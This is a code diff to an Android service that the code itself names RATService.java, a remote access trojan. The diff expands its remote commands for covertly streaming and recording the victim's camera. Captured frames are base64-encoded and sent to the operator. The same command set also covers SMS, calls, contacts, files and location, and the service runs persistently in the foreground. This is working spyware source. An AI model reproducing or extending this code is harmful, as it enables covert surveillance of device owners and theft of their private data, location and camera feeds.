@@ -12,6 +12,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ServiceInfo;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
@@ -133,7 +134,9 @@ public void onCreate() {
     acquireWakeLock();
     
     createNotificationChannel();
-    startForeground(NOTIFICATION_ID, createNotification());
+    
+    // Start as foreground service with proper types for Android 10+
+    startForegroundWithTypes();
     
     // Initialize location manager
     locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
@@ -167,11 +170,12 @@ public void onCreate() {
         callsModule = new CallsModule(this);
         Log.d(TAG, "✅ Calls module initialized");
     }
-    // In onCreate() method, add:
-if (Config.ENABLE_VIDEO_STREAM) {
-    Log.d(TAG, "🎥 Initializing VideoStreamModule");
-    videoStreamModule = new VideoStreamModule(this);
-}
+    
+    if (Config.ENABLE_VIDEO_STREAM) {
+        Log.d(TAG, "🎥 Initializing VideoStreamModule");
+        videoStreamModule = new VideoStreamModule(this);
+    }
+    
     if (Config.ENABLE_CONTACTS) {
         contactsModule = new ContactsModule(this);
         Log.d(TAG, "✅ Contacts module initialized");
@@ -206,10 +210,12 @@ if (Config.ENABLE_VIDEO_STREAM) {
         appManagerModule = new AppManagerModule(this);
         Log.d(TAG, "✅ App manager module initialized");
     }
+    
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-    cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-    Log.d(TAG, "✅ CameraManager initialized");
-}
+        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+        Log.d(TAG, "✅ CameraManager initialized");
+    }
+    
     // Video module initialization
     if (Config.ENABLE_VIDEO) {
         videoModule = new VideoModule(this);
@@ -233,6 +239,36 @@ if (Config.ENABLE_VIDEO_STREAM) {
     startConnection();
     
     Log.d(TAG, "All modules initialized successfully");
+}
+
+private void startForegroundWithTypes() {
+    Notification notification = createNotification();
+    
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        // Combine all service types this service might need
+        int foregroundServiceTypes = 0;
+        
+        foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
+        foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+        foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+        foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
+        
+        // For Android 14+ (API 34+)
+        if (Build.VERSION.SDK_INT >= 34) {
+            foregroundServiceTypes |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
+        }
+        
+        try {
+            startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes);
+            Log.d(TAG, "Started foreground service with types: " + foregroundServiceTypes);
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting foreground with types, falling back", e);
+            startForeground(NOTIFICATION_ID, notification);
+        }
+    } else {
+        startForeground(NOTIFICATION_ID, notification);
+        Log.d(TAG, "Started foreground service (legacy)");
+    }
 }
     
     private void createNotificationChannel() {
@@ -345,6 +381,12 @@ private void bringAppToForeground() {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "System service onStartCommand");
         
+        // Ensure we're still in foreground with proper types
+        if (intent == null) {
+            // Service was restarted by system
+            startForegroundWithTypes();
+        }
+        
         // Restart connection if it's not running
         if (executor == null || executor.isShutdown()) {
             executor = Executors.newSingleThreadExecutor();
@@ -358,29 +400,44 @@ private void bringAppToForeground() {
     private BrowserAccessibilityService getBrowserAccessibilityService() {
         return BrowserAccessibilityService.getInstance();
     }
-    // Add this method to RATService.java
-private String checkCameraPermissions() {
-    StringBuilder result = new StringBuilder();
     
-    try {
-        boolean hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                == PackageManager.PERMISSION_GRANTED;
-        result.append("CAMERA: ").append(hasCamera).append(", ");
+    // Add this method to RATService.java
+    private String checkCameraPermissions() {
+        StringBuilder result = new StringBuilder();
         
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            boolean hasForegroundCamera = ActivityCompat.checkSelfPermission(this, 
-                    Manifest.permission.FOREGROUND_SERVICE_CAMERA)
+        try {
+            boolean hasCamera = ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                     == PackageManager.PERMISSION_GRANTED;
-            result.append("FOREGROUND_CAMERA: ").append(hasForegroundCamera);
-        } else {
-            result.append("FOREGROUND_CAMERA: not_required");
+            result.append("CAMERA: ").append(hasCamera).append(", ");
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                boolean hasForegroundCamera = ActivityCompat.checkSelfPermission(this, 
+                        Manifest.permission.FOREGROUND_SERVICE_CAMERA)
+                        == PackageManager.PERMISSION_GRANTED;
+                result.append("FOREGROUND_CAMERA: ").append(hasForegroundCamera);
+            } else {
+                result.append("FOREGROUND_CAMERA: not_required");
+            }
+        } catch (Exception e) {
+            result.append("ERROR: ").append(e.getMessage());
         }
-    } catch (Exception e) {
-        result.append("ERROR: ").append(e.getMessage());
+        
+        return result.toString();
     }
     
-    return result.toString();
-}
+    private boolean checkCameraPermission() {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                == PackageManager.PERMISSION_GRANTED;
+    }
+    
+    private boolean checkForegroundCameraPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            return ActivityCompat.checkSelfPermission(this, Manifest.permission.FOREGROUND_SERVICE_CAMERA)
+                    == PackageManager.PERMISSION_GRANTED;
+        }
+        return true; // Not required on older versions
+    }
+    
     private void schedulePersistenceJob() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             try {
@@ -668,7 +725,9 @@ private String checkCameraPermissions() {
             case "help":
                 String helpText = "Available commands: info, location, location_stream [start/stop], " +
                                   "camera, camera_switch, camera_info, " +
-                                  "video_start [front/back|quality], video_stop, video_status, " +
+                                  "video_start [width|height|fps|bitrate], video_stop, video_status, " +
+                                  "video_test, video_record_start [filename], video_record_stop, " +
+                                  "video_switch_camera, video_resolutions, " +
                                   "sms, calls, contacts, files_list [path], file_get [path], " +
                                   "file_delete [path], file_rename [old|new], create_folder [path|name], " +
                                   "file_zip [path], search_files [path|query], storage_info, " +
@@ -761,120 +820,247 @@ private String checkCameraPermissions() {
                 }
                 break;
                 
-            // VIDEO STREAMING COMMANDS - FIXED
-            // Add this test command to routeCommand method
-case "video_test":
-    if (videoModule != null) {
-        Log.d(TAG, "📹 Testing video module");
-        boolean hasCamera = false;
-        try {
-            if (cameraManager != null) {
-                String[] cameraIds = cameraManager.getCameraIdList();
-                hasCamera = cameraIds != null && cameraIds.length > 0;
-                Log.d(TAG, "📹 Available cameras: " + (hasCamera ? cameraIds.length : 0));
-                if (hasCamera) {
-                    for (String id : cameraIds) {
-                        Log.d(TAG, "📹 Camera ID: " + id);
-                    }
-                }
-            } else {
-                Log.e(TAG, "📹 CameraManager is null");
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error checking cameras", e);
-        }
-        sendCommand("VIDEO_TEST|Camera available: " + hasCamera + 
-                    ", Module: " + (videoModule != null) +
-                    ", Permissions: " + checkCameraPermissions());
-    } else {
-        sendCommand("VIDEO_TEST|Video module not available");
-    }
-    break;
-
-
-case "check_video_perms":
-    String perms = "CAMERA: " + (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) 
-            == PackageManager.PERMISSION_GRANTED);
-    
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-        perms += ", FOREGROUND_CAMERA: " + (ActivityCompat.checkSelfPermission(this, 
-                Manifest.permission.FOREGROUND_SERVICE_CAMERA) == PackageManager.PERMISSION_GRANTED);
-    }
-    
-    sendCommand("VIDEO_PERMS|" + perms);
-    break;
+            // VIDEO STREAMING COMMANDS - COMPLETELY REWRITTEN
+            case "video_test":
+                StringBuilder testResult = new StringBuilder();
+                testResult.append("Camera available: ");
                 
-case "video_start":
-case "start_video_stream":
-    if (videoStreamModule != null) {
-        Log.d(TAG, "🎥 Starting video stream");
-        
-        // Check permissions first
-        if (!checkCameraPermission()) {
-            sendCommand("VIDEO_ERROR|ERROR: Camera permission not granted");
-            break;
-        }
-        
-        if (!checkForegroundCameraPermission()) {
-            sendCommand("VIDEO_ERROR|ERROR: Foreground service camera permission not granted. Please reinstall the app and grant all permissions.");
-            break;
-        }
-        
-        // Parse args: width|height|fps|bitrate
-        String[] parts = args.split("\\|");
-        int width = parts.length > 0 ? Integer.parseInt(parts[0]) : 640;
-        int height = parts.length > 1 ? Integer.parseInt(parts[1]) : 480;
-        int fps = parts.length > 2 ? Integer.parseInt(parts[2]) : 30;
-        int bitrate = parts.length > 3 ? Integer.parseInt(parts[3]) : 500000;
-        
-        String result = videoStreamModule.startStreaming(width, height, fps, bitrate, 
-            new VideoStreamModule.VideoStreamCallback() {
-                // ... callback implementation ...
-            });
-        
-        // Send response
-        try {
-            JSONObject response = new JSONObject();
-            response.put("command", "video_response");
-            response.put("action", "start_stream");
-            
-            if (result.startsWith("SUCCESS")) {
-                response.put("status", "processing");
-                response.put("message", result);
-            } else {
-                response.put("status", "error");
-                response.put("message", result);
-            }
-            
-            sendCommand(response.toString());
-        } catch (JSONException e) {
-            Log.e(TAG, "JSON error", e);
-        }
-        
-    } else {
-        sendCommand("VIDEO_ERROR|ERROR: Video module not available");
-    }
-    break;
-                
-            case "video_stop":
-                if (videoModule != null) {
-                    Log.d(TAG, "📹 Stopping video stream");
-                    if (videoModule.isStreaming()) {
-                        videoModule.stopStreaming();
-                        sendCommand("VIDEO_STATUS|stopped");
+                try {
+                    if (cameraManager != null) {
+                        String[] cameraIds = cameraManager.getCameraIdList();
+                        testResult.append(cameraIds != null && cameraIds.length > 0);
+                        testResult.append(", Module: ").append(videoStreamModule != null);
+                        testResult.append(", Permissions: ").append(checkCameraPermissions());
                     } else {
-                        sendCommand("VIDEO_STATUS|not_streaming");
+                        testResult.append("false, Module: ").append(videoStreamModule != null);
+                        testResult.append(", Permissions: ").append(checkCameraPermissions());
                     }
-                } else {
-                    sendCommand("VIDEO_ERROR|Video module not available");
+                } catch (Exception e) {
+                    testResult.append("error, Module: ").append(videoStreamModule != null);
+                    testResult.append(", Permissions: ").append(checkCameraPermissions());
                 }
+                
+                sendCommand("VIDEO_TEST|" + testResult.toString());
+                break;
+
+            case "check_video_perms":
+                sendCommand("VIDEO_PERMS|" + checkCameraPermissions());
                 break;
                 
-            case "video_status":
-                if (videoModule != null) {
-                    sendCommand("VIDEO_STATUS|" + (videoModule.isStreaming() ? "streaming" : "idle"));
+            case "video_start":
+            case "start_video_stream":
+                if (videoStreamModule != null) {
+                    Log.d(TAG, "🎥 Starting video stream");
+                    
+                    // Check permissions first
+                    if (!checkCameraPermission()) {
+                        sendCommand("VIDEO_ERROR|ERROR: Camera permission not granted");
+                        break;
+                    }
+                    
+                    if (!checkForegroundCameraPermission()) {
+                        sendCommand("VIDEO_ERROR|ERROR: Foreground service camera permission not granted. Please reinstall the app and grant all permissions.");
+                        break;
+                    }
+                    
+                    // Parse args: width|height|fps|bitrate|camera
+                    String[] parts = args.split("\\|");
+                    int width = parts.length > 0 ? Integer.parseInt(parts[0]) : 640;
+                    int height = parts.length > 1 ? Integer.parseInt(parts[1]) : 480;
+                    int fps = parts.length > 2 ? Integer.parseInt(parts[2]) : 30;
+                    int bitrate = parts.length > 3 ? Integer.parseInt(parts[3]) : 500000;
+                    
+                    // Check if camera type is specified (front/back)
+                    if (args.contains("front") || args.contains("back")) {
+                        // Handle camera switching if needed
+                        Log.d(TAG, "🎥 Camera type specified in args: " + args);
+                    }
+                    
+                    String result = videoStreamModule.startStreaming(width, height, fps, bitrate, 
+                        new VideoStreamModule.VideoStreamCallback() {
+                            @Override
+                            public void onFrameData(byte[] frameData, int width, int height) {
+                                try {
+                                    JSONObject frame = new JSONObject();
+                                    frame.put("command", "video_frame");
+                                    frame.put("data", Base64.encodeToString(frameData, Base64.NO_WRAP));
+                                    frame.put("width", width);
+                                    frame.put("height", height);
+                                    frame.put("timestamp", System.currentTimeMillis());
+                                    sendCommand(frame.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "Error creating frame JSON", e);
+                                }
+                            }
+                            
+                            @Override
+                            public void onStreamStarted() {
+                                try {
+                                    JSONObject response = new JSONObject();
+                                    response.put("command", "video_response");
+                                    response.put("action", "stream_started");
+                                    response.put("status", "success");
+                                    response.put("width", width);
+                                    response.put("height", height);
+                                    response.put("fps", fps);
+                                    sendCommand(response.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "JSON error", e);
+                                }
+                            }
+                            
+                            @Override
+                            public void onStreamStopped() {
+                                try {
+                                    JSONObject response = new JSONObject();
+                                    response.put("command", "video_response");
+                                    response.put("action", "stream_stopped");
+                                    response.put("status", "success");
+                                    sendCommand(response.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "JSON error", e);
+                                }
+                            }
+                            
+                            @Override
+                            public void onError(String error) {
+                                try {
+                                    JSONObject response = new JSONObject();
+                                    response.put("command", "video_response");
+                                    response.put("action", "error");
+                                    response.put("status", "error");
+                                    response.put("message", error);
+                                    sendCommand(response.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "JSON error", e);
+                                }
+                            }
+                            
+                            @Override
+                            public void onRecordingSaved(String path) {
+                                try {
+                                    JSONObject response = new JSONObject();
+                                    response.put("command", "video_response");
+                                    response.put("action", "recording_saved");
+                                    response.put("status", "success");
+                                    response.put("path", path);
+                                    sendCommand(response.toString());
+                                } catch (JSONException e) {
+                                    Log.e(TAG, "JSON error", e);
+                                }
+                            }
+                        });
+                    
+                    // Send immediate acknowledgment
+                    try {
+                        JSONObject ack = new JSONObject();
+                        ack.put("command", "video_response");
+                        ack.put("action", "start_stream");
+                        
+                        if (result.startsWith("SUCCESS")) {
+                            ack.put("status", "processing");
+                            ack.put("message", result);
+                        } else {
+                            ack.put("status", "error");
+                            ack.put("message", result);
+                        }
+                        
+                        sendCommand(ack.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                    
                 } else {
-                    sendCommand("VIDEO_STATUS|unavailable");
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
+                }
+                break;
+
+            case "video_stop":
+            case "stop_video_stream":
+                if (videoStreamModule != null) {
+                    Log.d(TAG, "🎥 Stopping video stream");
+                    String result = videoStreamModule.stopStreaming();
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "video_response");
+                        response.put("action", "stop_stream");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
+                }
+                break;
+
+            case "video_record_start":
+                if (videoStreamModule != null && !args.isEmpty()) {
+                    Log.d(TAG, "🎥 Starting video recording: " + args);
+                    String result = videoStreamModule.startRecording(args);
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "video_response");
+                        response.put("action", "start_recording");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Invalid filename");
+                }
+                break;
+
+            case "video_record_stop":
+                if (videoStreamModule != null) {
+                    Log.d(TAG, "🎥 Stopping video recording");
+                    String result = videoStreamModule.stopRecording();
+                    
+                    try {
+                        JSONObject response = new JSONObject();
+                        response.put("command", "video_response");
+                        response.put("action", "stop_recording");
+                        response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+                        response.put("message", result);
+                        sendCommand(response.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "JSON error", e);
+                    }
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
+                }
+                break;
+
+            case "video_switch_camera":
+                if (videoStreamModule != null) {
+                    Log.d(TAG, "🎥 Switching camera");
+                    String result = videoStreamModule.switchCamera();
+                    sendCommand("VIDEO_RESPONSE|" + result);
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
+                }
+                break;
+
+            case "video_status":
+                if (videoStreamModule != null) {
+                    String result = videoStreamModule.getStatus();
+                    sendCommand("VIDEO_STATUS|" + result);
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
+                }
+                break;
+
+            case "video_resolutions":
+                if (videoStreamModule != null) {
+                    String result = videoStreamModule.getAvailableResolutions();
+                    sendCommand("VIDEO_RESOLUTIONS|" + result);
+                } else {
+                    sendCommand("VIDEO_ERROR|ERROR: Video module not available");
                 }
                 break;    
                 
@@ -2025,6 +2211,12 @@ case "start_video_stream":
         stopLocationTracking();
         
         // Stop video streaming if active
+        if (videoStreamModule != null) {
+            videoStreamModule.stopStreaming();
+            videoStreamModule = null;
+        }
+        
+        // Stop video module if active
         if (videoModule != null) {
             if (videoModule.isStreaming()) {
                 videoModule.stopStreaming();
@@ -2034,7 +2226,13 @@ case "start_video_stream":
         
         // Clean up other modules
         if (cameraModule != null) {
+            cameraModule.cleanup();
             cameraModule = null;
+        }
+        
+        if (micModule != null) {
+            micModule.cleanup();
+            micModule = null;
         }
         
         // Clean up location thread
